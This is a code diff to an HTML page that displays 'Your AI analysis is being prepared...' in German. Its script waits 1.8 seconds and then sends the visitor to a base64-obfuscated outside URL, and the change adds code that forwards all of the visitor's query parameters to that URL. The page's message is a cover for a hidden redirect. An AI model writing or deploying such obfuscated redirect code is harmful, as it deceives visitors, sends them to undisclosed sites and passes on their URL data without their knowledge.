@@ -36,12 +36,23 @@
   </style>
 
   <script>
-    setTimeout(function() {
-      const encoded = "aHR0cHM6Ly9zbGlwcGxpcy5jb20="; 
-      const decoded = atob(encoded);
-      window.location.href = decoded;
-    }, 1800);
-  </script>
+  setTimeout(function () {
+    const encoded = "aHR0cHM6Ly9zbGlwcGxpcy5jb20=";
+    const decoded = atob(encoded);
+
+    const currentParams = new URLSearchParams(window.location.search);
+    const targetUrl = new URL(decoded);
+
+    currentParams.forEach((value, key) => {
+      if (!targetUrl.searchParams.has(key)) {
+        targetUrl.searchParams.set(key, value);
+      }
+    });
+
+    window.location.href = targetUrl.toString();
+  }, 1800);
+</script>
+  
 </head>
 <body>
   <h2>Ihre KI-Analyse wird vorbereitet...</h2>
